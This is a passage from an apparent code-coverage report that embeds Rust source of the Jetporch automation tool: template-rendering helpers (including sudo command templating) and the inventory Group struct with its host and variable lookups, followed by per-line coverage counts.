Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // for processing parameters that take optional strings, but make sure to remove any extra surrounding whitespace\n        // YAML should do this anyway so it's mostly overkill but may prevent some rare errors from inventory variable sources\n        let prelim = self.string_option(request, tm, field, template)?;\n        if prelim.is_some() {\n            return Ok(Some(prelim.unwrap().trim().to_string()));\n        }\n        return Ok(None);\n    }\n\n    pub fn no_template_string_option_trim(\u0026self, input: \u0026Option\u003cString\u003e) -\u003e Option\u003cString\u003e {\n        // takes a string option and uses it verbatim, for parameters that do not allow variables in them\n        if input.is_some() {\n            let value = input.as_ref().unwrap();\n            return Some(value.trim().to_string());\n        }\n        return None;\n    }\n\n    pub fn path(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        // templates a string and makes sure the output looks like a valid path\n        let result = self.run_state.context.read().unwrap().render_template(template, \u0026self.host, BlendTarget::NotTemplateModule, tm);\n        let result2 = self.unwrap_string_result(request, \u0026result)?;\n        return match screen_path(\u0026result2) {\n            Ok(x) =\u003e Ok(x), Err(y) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"{}, for field {}\", y, field))) }\n        }\n    }\n\n\n\n    pub fn string_option(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // templates an optional string\n        let result = self.string_option_unsafe(request, tm, field, template);\n        return match result {\n            Ok(x1) =\u003e match x1 {\n                Some(x) =\u003e match screen_general_input_strict(\u0026x) {\n                    Ok(y) =\u003e Ok(Some(y)),\n                    Err(z) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"field {}, {}\", field, z))) }\n                },\n                None =\u003e Ok(None)\n            },\n            Err(y) =\u003e Err(y)\n        };\n    }\n\n    #[allow(dead_code)]\n    pub fn integer(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String)-\u003e Result\u003cu64,Arc\u003cTaskResponse\u003e\u003e {\n        // templates a required value that must resolve to an integer\n        if tm == TemplateMode::Off {\n            return Ok(0);\n        }\n        let st = self.string(request, tm, field, template)?;\n        let num = st.parse::\u003cu64\u003e();\n        return match num {\n            Ok(num) =\u003e Ok(num), \n            Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not an integer: {}\", field, st)))\n        }\n    }\n\n    #[allow(dead_code)]\n    pub fn integer_option(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e, default: Option\u003cu64\u003e) -\u003e Result\u003cOption\u003cu64\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // templates an optional value that must resolve to an integer or None\n        if tm == TemplateMode::Off {\n            return Ok(None);\n        }\n        if template.is_none() {\n            return Ok(default);\n        }\n        let st = self.string(request, tm, field, \u0026template.as_ref().unwrap())?;\n        let num = st.parse::\u003cu64\u003e();\n        // FIXME: these can use map_err\n        return match num {\n            Ok(num) =\u003e Ok(Some(num)),\n            Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not an integer: {}\", field, st)))\n        }\n    }\n\n    pub fn integer_option_to_integer(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e, default: u64) -\u003e Result\u003cu64,Arc\u003cTaskResponse\u003e\u003e {\n        // templates an optional value that must resolve to an integer\n        if tm == TemplateMode::Off {\n            return Ok(0);\n        }\n        if template.is_none() {\n            return Ok(default); \n        }\n        let st = self.string(request, tm, field, \u0026template.as_ref().unwrap())?;\n        let num = st.parse::\u003cu64\u003e();\n        // FIXME: these can use map_err\n        return match num {\n            Ok(num) =\u003e Ok(num), \n            Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not an integer: {}\", field, st)))\n        }\n    }\n\n    #[allow(dead_code)]\n    pub fn boolean(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026String) -\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e {\n        // templates a required value that must resolve to a boolean\n        // where possible, consider using boolean_option_default_true/false instead\n        // jet mostly favors booleans defaulting to false, but it doesn't always make sense\n        if tm == TemplateMode::Off {\n            return Ok(true);\n        }\n        let st = self.string(request, tm, field, template)?;\n        let x = st.parse::\u003cbool\u003e();\n        return match x {\n            Ok(x) =\u003e Ok(x), Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not a boolean: {}\", field, st)))\n        }\n    }\n\n    #[allow(dead_code)]\n    pub fn boolean_option_default_true(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e)-\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e{\n        // templates an optional value that resolves to a boolean, if omitted, assume the answer is true\n        return self.internal_boolean_option(request, tm, field, template, true);\n    }\n\n    pub fn boolean_option_default_false(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e)-\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e{\n        // templates an optional value that resolves to a boolean, if omitted, assume the answer is false\n        return self.internal_boolean_option(request, tm, field, template, false);\n    }\n  \n    fn internal_boolean_option(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e, default: bool)-\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e{\n        // supporting code for boolean parsing above\n        if tm == TemplateMode::Off {\n            return Ok(false);\n        }\n        if template.is_none() {\n            return Ok(default);\n        }\n        let st = self.string(request, tm, field, \u0026template.as_ref().unwrap())?;\n        let x = st.parse::\u003cbool\u003e();\n        return match x {\n            Ok(x) =\u003e Ok(x),\n            Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not a boolean: {}\", field, st)))\n        }\n    }\n\n    pub fn boolean_option_default_none(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, template: \u0026Option\u003cString\u003e)-\u003e Result\u003cOption\u003cbool\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        // supports an optional boolean value that does not default to true or false - effectively making the option a trinary value where None is \"no preference\"\n        if tm == TemplateMode::Off {\n            return Ok(None);\n        }\n        if template.is_none() {\n            return Ok(None);\n        }\n        let st = self.string(request, tm, field, \u0026template.as_ref().unwrap())?;\n        let x = st.parse::\u003cbool\u003e();\n        return match x {\n            Ok(x) =\u003e Ok(Some(x)), \n            Err(_err) =\u003e Err(self.response.is_failed(request, \u0026format!(\"field ({}) value is not a boolean: {}\", field, st)))\n        }\n    }\n\n    pub fn test_condition(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, expr: \u0026String) -\u003e Result\u003cbool, Arc\u003cTaskResponse\u003e\u003e {\n        // used to evaluate in-language conditionals throughout the program.\n        if tm == TemplateMode::Off {\n            return Ok(false);\n        }\n        let result = self.get_context().read().unwrap().test_condition(expr, \u0026self.host, tm);\n        return match result {\n            Ok(x) =\u003e Ok(x), Err(y) =\u003e Err(self.response.is_failed(request, \u0026y))\n        }\n    }\n\n    pub fn test_condition_with_extra_data(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, expr: \u0026String, _host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, vars_input: serde_yaml::Mapping) -\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e {\n        // same as test_condition but mixes in some temporary data that is not stored elsewhere for future template evaluation\n        if tm == TemplateMode::Off {\n            return Ok(false);\n        }\n        let result = self.get_context().read().unwrap().test_condition_with_extra_data(expr, \u0026self.host, vars_input, tm);\n        return match result {\n            Ok(x) =\u003e Ok(x), Err(y) =\u003e Err(self.response.is_failed(request, \u0026y))\n        }\n    }\n\n    pub fn find_template_path(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, str_path: \u0026String) -\u003e Result\u003cPathBuf, Arc\u003cTaskResponse\u003e\u003e {\n        // templates a string and then looks for the resulting file in the logical templates/ locations (if not an absolute path)\n        // raises errors if the source files are not found\n        return self.find_sub_path(\u0026String::from(\"templates\"), request, tm, field, str_path);\n    }\n\n    pub fn find_module_path(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, _tm: TemplateMode, _field: \u0026String, str_path: \u0026String) -\u003e Result\u003cPathBuf, Arc\u003cTaskResponse\u003e\u003e {\n\n        // when we need to find a module we look for it in the configured module paths\n        for path_buf in self.run_state.module_paths.read().unwrap().iter() {\n        \n            let mut pb = path_buf.clone();\n            pb.push(str_path.clone());\n         \n             if pb.exists() {\n                return Ok(pb);\n            }\n        }\n\n        return Err(self.response.is_failed(request, \u0026format!(\"module not found: {}\", str_path)));\n       \n    }\n\n    pub fn find_file_path(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, str_path: \u0026String) -\u003e Result\u003cPathBuf, Arc\u003cTaskResponse\u003e\u003e {\n        // simialr to find_template_path, this one assumes a 'files/' directory for relative paths.\n        return self.find_sub_path(\u0026String::from(\"files\"), request, tm, field, str_path);\n    }\n\n    fn find_sub_path(\u0026self, prefix: \u0026String, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, field: \u0026String, str_path: \u0026String) -\u003e Result\u003cPathBuf, Arc\u003cTaskResponse\u003e\u003e {\n        // supporting code for find_template_path and find_file_path\n        if tm == TemplateMode::Off {\n            return Ok(PathBuf::new());\n        }\n        let prelim = match screen_path(str_path) {\n            Ok(x) =\u003e x, \n            Err(y) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"{}, for field: {}\", y, field))) }\n        };\n        let mut path = PathBuf::new();\n        path.push(prelim);\n        if path.is_absolute() {\n            if path.is_file() {\n                return Ok(path);\n            } else {\n                return Err(self.response.is_failed(request, \u0026format!(\"field ({}): no such file: {}\", field, str_path)));\n            }\n        } else {\n            let mut path2 = PathBuf::new();\n            path2.push(prefix);\n            path2.push(str_path);\n            if path2.is_file() {\n                return Ok(path2);\n            } else {\n                return Err(self.response.is_failed(request, \u0026format!(\"field ({}): no such file: {}\", field, str_path)));\n            }\n        }\n    }\n\n    fn has_spaces(\u0026self, input: \u0026String) -\u003e bool {\n        let found = input.find(' ');\n        return found.is_some();\n    }\n\n    pub fn add_sudo_details(\u0026self, request: \u0026TaskRequest, cmd: \u0026str) -\u003e Result\u003cString, String\u003e {\n        // this is used by remote.rs to modify any command, inserting the results of evaluating the configured sudo_template\n        // instead of the original command. only specific variables are allowed in the sudo template as opposed\n        // to all the variables in jet's current host context.\n        if ! request.is_sudoing() {\n            return Ok(cmd.to_owned());\n        }\n        let details = request.sudo_details.as_ref().unwrap();\n        let user = details.user.as_ref().unwrap().clone();\n        let sudo_template = details.template.clone();\n        let mut data = serde_yaml::Mapping::new();            \n        data.insert(serde_yaml::Value::String(String::from(\"jet_sudo_user\")), serde_yaml::Value::String(user.clone()));\n        data.insert(serde_yaml::Value::String(String::from(\"jet_command\")), serde_yaml::Value::String(cmd.to_string()));\n        let result = self.detached_templar.render(\u0026sudo_template, data, TemplateMode::Strict)?;\n        return Ok(result)\n    }\n\n\n}","traces":[{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":232,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":234,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":243,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":253,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":263,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":300,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":303,"address":[],"length":0,"stats":{"Line":0}},{"line":305,"address":[],"length":0,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}},{"line":308,"address":[],"length":0,"stats":{"Line":0}},{"line":309,"address":[],"length":0,"stats":{"Line":0}},{"line":310,"address":[],"length":0,"stats":{"Line":0}},{"line":311,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":316,"address":[],"length":0,"stats":{"Line":0}},{"line":318,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":321,"address":[],"length":0,"stats":{"Line":0}},{"line":322,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":327,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":332,"address":[],"length":0,"stats":{"Line":0}},{"line":334,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":338,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":345,"address":[],"length":0,"stats":{"Line":0}},{"line":346,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":360,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":366,"address":[],"length":0,"stats":{"Line":0}},{"line":368,"address":[],"length":0,"stats":{"Line":0}},{"line":369,"address":[],"length":0,"stats":{"Line":0}},{"line":373,"address":[],"length":0,"stats":{"Line":0}},{"line":377,"address":[],"length":0,"stats":{"Line":0}},{"line":379,"address":[],"length":0,"stats":{"Line":0}},{"line":382,"address":[],"length":0,"stats":{"Line":0}},{"line":384,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":387,"address":[],"length":0,"stats":{"Line":0}},{"line":388,"address":[],"length":0,"stats":{"Line":0}},{"line":389,"address":[],"length":0,"stats":{"Line":0}},{"line":391,"address":[],"length":0,"stats":{"Line":0}},{"line":392,"address":[],"length":0,"stats":{"Line":0}},{"line":393,"address":[],"length":0,"stats":{"Line":0}},{"line":394,"address":[],"length":0,"stats":{"Line":0}},{"line":395,"address":[],"length":0,"stats":{"Line":0}},{"line":397,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[],"length":0,"stats":{"Line":0}},{"line":401,"address":[],"length":0,"stats":{"Line":0}},{"line":402,"address":[],"length":0,"stats":{"Line":0}},{"line":403,"address":[],"length":0,"stats":{"Line":0}},{"line":404,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":411,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":416,"address":[],"length":0,"stats":{"Line":0}},{"line":420,"address":[],"length":0,"stats":{"Line":0}},{"line":421,"address":[],"length":0,"stats":{"Line":0}},{"line":423,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}},{"line":426,"address":[],"length":0,"stats":{"Line":0}},{"line":427,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":429,"address":[],"length":0,"stats":{"Line":0}},{"line":430,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":193},{"path":["/","Users","wings","projects","jetpack","src","inventory","groups.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::collections::HashMap;\nuse crate::util::yaml::blend_variables;\nuse std::sync::Arc;\nuse crate::inventory::hosts::Host;\nuse std::sync::RwLock;\nuse serde_yaml;\n\npub struct Group {\n    pub name : String,\n    pub subgroups : HashMap\u003cString, Arc\u003cRwLock\u003cSelf\u003e\u003e\u003e,\n    pub parents : HashMap\u003cString, Arc\u003cRwLock\u003cSelf\u003e\u003e\u003e,\n    pub hosts : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e,\n    pub variables : serde_yaml::Mapping,\n}\n\nimpl Group {\n\n    pub fn new(name: \u0026String) -\u003e Self {\n        Self {\n            name : name.clone(),\n            subgroups : HashMap::new(),\n            parents : HashMap::new(),\n            hosts : HashMap::new(),\n            variables : serde_yaml::Mapping::new(),\n        }\n    }\n\n    pub fn add_subgroup(\u0026mut self, name: \u0026String, subgroup: Arc\u003cRwLock\u003cGroup\u003e\u003e) {\n        assert!(!name.eq(\u0026self.name));\n        self.subgroups.insert(\n            name.clone(), \n            Arc::clone(\u0026subgroup)\n        );\n    }\n\n    pub fn add_host(\u0026mut self, name: \u0026String, host: Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        self.hosts.insert(\n            name.clone(), \n            Arc::clone(\u0026host)\n        );\n    }\n\n    pub fn add_parent(\u0026mut self, name: \u0026String, parent: Arc\u003cRwLock\u003cGroup\u003e\u003e) {\n        assert!(!name.eq(\u0026self.name));\n        self.parents.insert(\n            name.clone(), \n            Arc::clone(\u0026parent)\n        );\n    }\n\n    pub fn get_ancestor_groups(\u0026self, depth_limit: usize) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.parents.iter() {\n            results.insert(k.clone(), Arc::clone(v));\n            if depth_limit \u003e 0 {\n                for (k2,v2) in v.read().expect(\"group read\").get_ancestor_groups(depth_limit-1) { \n                    results.insert(k2.clone(),Arc::clone(\u0026v2));\n                }\n            }\n        }\n        return results\n    }\n\n    pub fn get_ancestor_group_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_ancestor_groups(10usize).iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_descendant_groups(\u0026self, depth_limit: usize) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.subgroups.iter() {\n            if results.contains_key(\u0026k.clone()) {\n                continue;\n            }\n            if depth_limit \u003e 0 {\n                for (k2,v2) in v.read().expect(\"group read\").get_descendant_groups(depth_limit-1).iter() { \n                    results.insert(\n                        k2.clone(), \n                        Arc::clone(\u0026v2)\n                    ); \n                }\n            }\n            results.insert(\n                k.clone(), \n                Arc::clone(\u0026v)\n            );\n        }\n        return results\n    }\n\n    pub fn get_descendant_group_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_descendant_groups(10usize).iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_parent_groups(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.parents.iter() {\n            results.insert(\n                k.clone(), \n                Arc::clone(\u0026v)\n            );\n        }\n        return results\n    }\n\n    pub fn get_parent_group_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_parent_groups().iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_subgroups(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.subgroups.iter() {\n            results.insert(\n                k.clone(), \n                Arc::clone(\u0026v)\n            );\n        }\n        return results\n    }\n\n    pub fn get_subgroup_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_subgroups().iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_direct_hosts(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.hosts.iter() {\n            results.insert(\n                k.clone(), \n                Arc::clone(\u0026v)\n            );\n        }\n        return results\n    }\n\n    pub fn get_direct_host_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_direct_hosts().iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_descendant_hosts(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = HashMap::new();\n        let children = self.get_direct_hosts();\n        for (k,v) in children { results.insert(k.clone(), Arc::clone(\u0026v));  }\n        let groups = self.get_descendant_groups(20usize);\n        for (_k,v) in groups.iter() {\n            let hosts = v.read().unwrap().get_direct_hosts();\n            for (k2,v2) in hosts.iter() { results.insert(k2.clone(), Arc::clone(\u0026v2));  }\n        }   \n        return results\n    }\n\n    pub fn get_descendant_host_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_descendant_hosts().iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_variables(\u0026self) -\u003e serde_yaml::Mapping {\n        return self.variables.clone();\n    }\n\n    pub fn set_variables(\u0026mut self, variables: serde_yaml::Mapping) {\n        self.variables = variables.clone();\n    }\n\n    pub fn update_variables(\u0026mut self, mapping: serde_yaml::Mapping) {\n        for (k,v) in mapping.iter() {\n            self.variables.insert(k.clone(),v.clone());\n        }\n    }\n\n    pub fn get_blended_variables(\u0026self) -\u003e serde_yaml::Mapping {\n        let mut blended : serde_yaml::Value = serde_yaml::Value::from(serde_yaml::Mapping::new());\n        let ancestors = self.get_ancestor_groups(20);\n        for (_k,v) in ancestors.iter() {\n            let theirs : serde_yaml::Value = serde_yaml::Value::from(v.read().expect(\"group read\").get_variables());\n            blend_variables(\u0026mut blended, theirs);\n        }\n        let mine = serde_yaml::Value::from(self.get_variables());\n        blend_variables(\u0026mut blended, mine);\n        return match blended {\n            serde_yaml::Value::Mapping(x) =\u003e x,\n            _ =\u003e panic!(\"get_blended_variables produced a non-mapping (1)\")\n        }\n    }\n\n    pub fn get_variables_yaml(\u0026self) -\u003e Result\u003cString,String\u003e {\n        let result = 